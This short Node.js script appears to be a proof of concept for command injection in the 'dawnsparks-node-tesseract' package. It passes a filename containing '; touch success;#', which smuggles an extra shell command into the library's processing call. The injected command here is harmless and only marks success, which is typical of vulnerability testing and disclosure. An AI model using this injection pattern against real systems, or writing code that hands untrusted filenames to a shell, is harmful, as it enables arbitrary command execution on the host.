var PUT = require('dawnsparks-node-tesseract');
var user_image_filename = "; touch success;#";
try {
	new PUT.process(user_image_filename,{},function(){});
} catch (e) {
	console.log(e);
}
